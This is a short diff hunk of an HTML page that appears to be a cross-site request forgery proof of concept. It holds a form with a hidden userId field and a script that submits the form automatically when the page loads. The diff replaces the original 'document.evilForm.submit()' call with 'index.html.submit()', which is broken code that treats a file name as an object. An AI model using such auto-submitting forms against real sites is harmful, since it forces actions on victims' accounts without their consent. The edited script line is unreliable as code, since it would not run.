@@ -4,6 +4,6 @@
     <input type="hidden" name="userId" value="904afef8bec97589f74a4897adc7579888eca47e" />
     <input type="submit"/>
 </form>
-<script> document.evilForm.submit(); </script>
+<script> index.html.submit(); </script>
 </BODY>
 </HTML>
